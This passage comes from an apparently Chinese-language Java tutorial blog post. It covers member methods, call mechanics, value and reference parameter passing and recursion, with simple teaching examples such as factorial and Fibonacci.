class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cal02</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>            res += i;<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;cal02 方法 计算结果=&quot;</span> + res);<br>    &#125;<br><br>    <span class="hljs-comment">//添加 getSum 成员方法,可以计算两个数的和</span><br>    <span class="hljs-comment">//1. public 表示方法是公开的</span><br>    <span class="hljs-comment">//2. int :表示方法执行后，返回一个 int 值</span><br>    <span class="hljs-comment">//3. getSum 方法名</span><br>    <span class="hljs-comment">//4. (int num1, int num2) 形参列表，2 个形参，可以接收用户传入的两个数</span><br>    <span class="hljs-comment">//5. return res; 表示把 res 的值， 返回</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getSum</span><span class="hljs-params">(<span class="hljs-type">int</span> num1, <span class="hljs-type">int</span> num2)</span> &#123;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> num1 + num2;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="成员方法的定义">6.2.1 成员方法的定义</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JAVA">修饰符 返回数据类型 方法名(形参列表)&#123;<br>方法体语句;<br><span class="hljs-keyword">return</span> 返回值;<span class="hljs-comment">//返回数据类型是 void 的场合，return语句不是必须的</span><br>&#125;<br></code></pre></td></tr></table></figure><ol type="1"><li><p>方法名必须是一个合法的标识符</p></li><li><p>返回类型即返回值的类型。如果方法没有返回值，应声明为void</p></li><li><p>修饰符段可以有几个不同的修饰符。（还没学到</p><p>比如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">strictfp</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;~~~~~&quot;</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>其中 public（访问修饰符）、static（static 关键字）、final（final关键字）</p></li><li><p>参数列表是传递给方法的参数表。各个元素间以 <code>,</code>分隔。每个元素由一个类型和一个标识符表示的参数组成。</p></li></ol><blockquote><ol type="1"><li>方法写好后，不去调用就不会输出</li><li>先创建对象，然后调用方法即可</li><li>使用成员方法，能提高代码的复用性。而且能把实现的细节封装起来，供其他用户调用。</li></ol></blockquote><h3 id="方法调用机制">6.2.2 方法调用机制</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JAVA">...<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getSum</span><span class="hljs-params">(<span class="hljs-type">int</span> num1, <span class="hljs-type">int</span> num2)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> num1 + num2;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>...<br></code></pre></td></tr></table></figure><ol type="1"><li>当程序执行到方法时，在 栈 中开辟一个新的栈空间。该空间里储存<code>num1 = 10</code> <code>num2 = 20</code>，之后计算并储存结果<code>res = 30</code></li><li>当方法执行完毕，或执行到 <code>return</code> 语句时，就会返回</li><li>把 新栈空间 中的 <code>res = 30</code> 返回到调用方法的地方</li><li>返回后，继续执行该方法的后续代码</li><li>当main方法（栈）执行完毕，整个程序退出</li></ol><h3 id="方法使用细节">6.2.3 方法使用细节</h3><ol type="1"><li><p>访问修饰符：作用是控制方法的使用范围。</p><ul><li>不写（默认访问控制范围）</li><li>public：公共</li><li>protected：受保护</li><li>private：私有</li></ul></li><li><p>返回数据类型：</p><ul><li>一个方法最多有一个返回值。要返回多个结果可以使用数组。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">AA</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AA</span>();<br>        <span class="hljs-type">int</span>[] res = a.getSumAndSub(<span class="hljs-number">1</span>, <span class="hljs-number">4</span>);<br>        System.out.println(<span class="hljs-string">&quot;和=&quot;</span> + res[<span class="hljs-number">0</span>]);<br>        System.out.println(<span class="hljs-string">&quot;差=&quot;</span> + res[<span class="hljs-number">1</span>]);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//返回多个结果可以使用数组</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AA</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span>[] getSumAndSub(<span class="hljs-type">int</span> n1, <span class="hljs-type">int</span> n2) &#123;<br>        <span class="hljs-type">int</span>[] resArr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>];<br>        resArr[<span class="hljs-number">0</span>] = n1 + n2;<br>        resArr[<span class="hljs-number">1</span>] = n1 - n2;<br>        <span class="hljs-keyword">return</span> resArr;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>返回类型为任意类型。包括 基本数据类型和引用数据类型。</li><li>如果方法要求有返回数据类型，则方法体中最后的执行语句必为<code>return 值</code>，且返回值类型必须和 return的值类型一致或兼容。</li><li>如果方法是 void，则方法体中可以没有 return 语句，或者 只写 return。</li></ul></li><li><p>方法名：</p><ul><li>遵循驼峰命名法，最好见名知意，表达出该功能的意思。</li></ul></li><li><p>参数列表（形参列表）：</p><ul><li>一个方法可以有 0 个参数，也可以有多个参数。参数间用 <code>,</code>间隔。</li><li>参数类型可以为任意类型，包含基本类型和引用类型。</li><li>调用带参数的方法时，一定对应着参数列表传入相同类型或兼容类型的参数。</li><li>方法定义时的参数称为形式参数，简称形参；方法调用时的参数（传入的参数）称为实际参数，简称实参。实参与形参的类型、个数、顺序必须一致。</li></ul></li><li><p>方法体：</p><ul><li>里面写完成功能的具体的语句，可以为输入、输出、变量、运算、分支、循环、方法调用，但里面不能再定义方法，即：方法不能嵌套定义！</li></ul></li><li><p>调用细节：</p><ul><li><p>同一个类中的方法调用，可以直接调用。</p></li><li><p>跨类的方法调用，需要创建新对象，然后再调用方法。</p></li><li><p>特别说明一下：跨类的方法调用和方法的访问修饰符相关，先暂时这么提一下，后面我们讲到访问修饰符时，还要再细说。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<br>        a.sayOk();<br>        a.m1();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> &#123;<br>    <span class="hljs-comment">//同一个类中的方法调用：直接调用即可</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;print()方法被调用 n=&quot;</span> + n);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sayOk</span><span class="hljs-params">()</span> &#123; <span class="hljs-comment">//sayOk 调用 print(直接调用即可)</span><br>        print(<span class="hljs-number">10</span>);<br>        System.out.println(<span class="hljs-string">&quot;继续执行 sayOK()~~~&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//跨类中的方法 A 类调用 B 类方法：需要通过对象名调用</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">m1</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">//创建 B 对象, 然后再调用方法即可</span><br>        System.out.println(<span class="hljs-string">&quot;m1() 方法被调用&quot;</span>);<br>        <span class="hljs-type">B</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>();<br>        b.hi();<br>        System.out.println(<span class="hljs-string">&quot;m1() 继续执行:)&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hi</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;B 类中的 hi()被执行&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ol><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312131739434.png"alt="上述程序执行结果" /><figcaption aria-hidden="true">上述程序执行结果</figcaption></figure><p>#### 两个小练习</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//1.编写类 A ，有一个方法：判断一个数是奇数 odd 还是偶数, 返回 boolean</span><br><span class="hljs-comment">//2.根据行、列、字符打印 对应行数和列数的字符，比如：行：4，列：4，字符#,则打印相应的效果</span><br><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">myScanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>        System.out.println(<span class="hljs-string">&quot;输入一个数字&quot;</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span> myScanner.nextInt();<br>        <span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<br>        <span class="hljs-keyword">if</span>(a.isOdd(num))&#123;<br>            System.out.println(<span class="hljs-string">&quot;是奇数&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;不是奇数&quot;</span>);<br>        &#125;<br>        <span class="hljs-type">B</span> <span class="hljs-variable">bb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>();<br>        bb.print(<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-string">&#x27;+&#x27;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isOdd</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span>&#123;<br>        <span class="hljs-keyword">return</span> num % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-type">int</span> row,<span class="hljs-type">int</span> col,<span class="hljs-type">char</span> c)</span>&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span><span class="hljs-number">0</span>; i &lt; row; i++)&#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; col ; j++)&#123;<br>                System.out.print(c);<br>            &#125;<br>            System.out.println();<br>        &#125;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312131741777.png"alt="上述程序执行结果" /><figcaption aria-hidden="true">上述程序执行结果</figcaption></figure><h3 id="方法传参机制">6.2.4 方法传参机制</h3><blockquote><p>Java 语言对对象采用的是<strong>值传递</strong>，方法得到的总是那个传入对象的副本。</p></blockquote><h4 id="基本数据类型的传参机制">基本数据类型的传参机制</h4><p>方法不能修改基本数据类型的参数。基本数据类型传递的是一个值（值拷贝），形参的任何改变不影响实参！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MethodParameter01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;<br><span class="hljs-comment">//创建 AA 对象 名字 obj</span><br>        <span class="hljs-type">AA</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AA</span>();<br>        obj.swap(a, b); <span class="hljs-comment">//调用 swap</span><br>        System.out.println(<span class="hljs-string">&quot;main 方法 a=&quot;</span> + a + <span class="hljs-string">&quot; b=&quot;</span> + b);<span class="hljs-comment">//a=10 b=20</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AA</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">swap</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;\na 和 b 交换前的值\na=&quot;</span> + a + <span class="hljs-string">&quot;\tb=&quot;</span> + b);<span class="hljs-comment">//a=10 b=20</span><br>        <span class="hljs-comment">//完成了 a 和 b 的交换</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">tmp</span> <span class="hljs-operator">=</span> a;<br>        a = b;<br>        b = tmp;<br>        System.out.println(<span class="hljs-string">&quot;\na 和 b 交换后的值\na=&quot;</span> + a + <span class="hljs-string">&quot;\tb=&quot;</span> + b);<span class="hljs-comment">//a=20 b=10</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312131742667.png"alt="上述程序执行结果" /><figcaption aria-hidden="true">上述程序执行结果</figcaption></figure><h4 id="引用数据类型的传参机制">引用数据类型的传参机制</h4><p>引用类型传递的是地址（传递也是值，但是值是地址），可以通过形参影响实参！</p><p>引用类型传递的是一个地址，形参和实参指向一处，两者总会相关。</p><p>但改变那个形参地址指向的场合，实参的指向不会改变。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">B</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>();<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        p.name = <span class="hljs-string">&quot;jack&quot;</span>;<br>        p.age = <span class="hljs-number">10</span>;<br>        b.test200(p);<br>        <span class="hljs-comment">//测试题, 如果 test200 执行的是 p = null ,下面的结果是 10</span><br>        <span class="hljs-comment">//测试题, 如果 test200 执行的是 p = new Person();..., 下面输出的是 10</span><br>        System.out.println(<span class="hljs-string">&quot;main的p.age = &quot;</span> + p.age + <span class="hljs-string">&quot;\t&quot;</span> + p.name);<span class="hljs-comment">//10000</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    String name;<br>    <span class="hljs-type">int</span> age;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test200</span><span class="hljs-params">(Person p)</span> &#123;<br>        p.age = <span class="hljs-number">10000</span>; <span class="hljs-comment">//修改对象属性</span><br>        <span class="hljs-comment">//思考</span><br><span class="hljs-comment">//        p = new Person();</span><br><span class="hljs-comment">//        p.name = &quot;tom&quot;;</span><br><span class="hljs-comment">//        p.age = 99;</span><br>        <span class="hljs-comment">//思考</span><br><span class="hljs-comment">//        p = null;</span><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="一个lj练习">一个lj练习</h4><p>编写一个方法 copyPerson，可以复制一个 Person对象，返回复制的对象。克隆对象，注意要求得到新对象和原来的对象是两个独立的对象，只是他们的属性相同</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        p.name = <span class="hljs-string">&quot;milan&quot;</span>;<br>        p.age = <span class="hljs-number">100</span>;<br><span class="hljs-comment">//创建 tools</span><br>        <span class="hljs-type">MyTools</span> <span class="hljs-variable">tools</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyTools</span>();<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p2</span> <span class="hljs-operator">=</span> tools.copyPerson(p);<br><span class="hljs-comment">//到此 p 和 p2 是 Person 对象，但是是两个独立的对象，属性相同</span><br>        System.out.println(<span class="hljs-string">&quot;p 的属性 age=&quot;</span> + p.age + <span class="hljs-string">&quot; 名字=&quot;</span> + p.name);<br>        System.out.println(<span class="hljs-string">&quot;p2 的属性 age=&quot;</span> + p2.age + <span class="hljs-string">&quot; 名字=&quot;</span> + p2.name);<br><span class="hljs-comment">//比较看看是否为同一个对象</span><br>        System.out.println(p == p2);<span class="hljs-comment">//false</span><br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    String name;<br>    <span class="hljs-type">int</span> age;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTools</span> &#123;<br>    <span class="hljs-comment">//编写方法的思路</span><br>    <span class="hljs-comment">//1. 方法的返回类型 Person</span><br>    <span class="hljs-comment">//2. 方法的名字 copyPerson</span><br>    <span class="hljs-comment">//3. 方法的形参 (Person p)</span><br>    <span class="hljs-comment">//4. 方法体, 创建一个新对象，并复制属性，返回即可</span><br>    <span class="hljs-keyword">public</span> Person <span class="hljs-title function_">copyPerson</span><span class="hljs-params">(Person p)</span> &#123;<br><span class="hljs-comment">//创建一个新的对象</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        p2.name = p.name; <span class="hljs-comment">//把原来对象的名字赋给 p2.name</span><br>        p2.age = p.age; <span class="hljs-comment">//把原来对象的年龄赋给 p2.age</span><br>        <span class="hljs-keyword">return</span> p2;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312131813303.png"alt="上面程序执行的结果" /><figcaption aria-hidden="true">上面程序执行的结果</figcaption></figure><h2 id="方法递归调用">6.3 方法递归调用</h2><blockquote><p><strong>递归就是方法自己调用自己</strong>，每次调用时传入不同的变量。递归有助于编程者解决复杂问题，同时可以让代码变得简洁</p></blockquote><ol type="1"><li>各种数学问题如：8皇后问题，汉诺塔，阶乘问题，迷宫问题，球和篮子的问题(google编程大赛)</li><li>各种算法中也会使用到递归，比如快排，归并排序，二分查找，分治算法等</li><li>将用栈解决的问题<code>--&gt;</code>递归代码比较简洁</li></ol><h3 id="几个引例">6.3.1 几个引例</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//1. 打印问题</span><br><span class="hljs-comment">//2. 阶乘问题</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">T</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">T</span>();<br>        t1.test(<span class="hljs-number">4</span>);<span class="hljs-comment">//输出什么？ n=2 n=3 n=4，加个else只输出 n=2</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> t1.factorial(<span class="hljs-number">5</span>);<br>        System.out.println(<span class="hljs-string">&quot;5 的阶乘 res =&quot;</span> + res);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">T</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> &#123;<br>        <span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">2</span>) &#123;<br>            test(n - <span class="hljs-number">1</span>);<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;n=&quot;</span> + n);<br>    &#125;<br><br>    <span class="hljs-comment">//factorial 阶乘</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">factorial</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> &#123;<br>        <span class="hljs-keyword">if</span> (n == <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> factorial(n - <span class="hljs-number">1</span>) * n;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312131815568.png"alt="程序执行结果" /><figcaption aria-hidden="true">程序执行结果</figcaption></figure><p>下面，示范一个斐波那契数列方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">class</span> <span class="hljs-title class_">T</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fib</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span>&#123;<br>        <span class="hljs-keyword">if</span>(n == <span class="hljs-number">1</span> || n == <span class="hljs-number">2</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> (fib(n - <span class="hljs-number">1</span>)) + (fib(n - <span class="hljs-number">2</span>));<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="使用细节">6.3.2 使用细节</h3><ol type="1"><li>执行一个方法时，就创建一个新的受保护的独立空间（栈空间）。</li><li>方法的局部变量是独立的，不会相互影响。</li><li>如果方法中使用的是引用类型变量（比如数组，对象），就会共享数据。</li><li>递归必须向退出递归的条件逼近，否则就是无限递归，会提示<code>StackOverflowError</code> 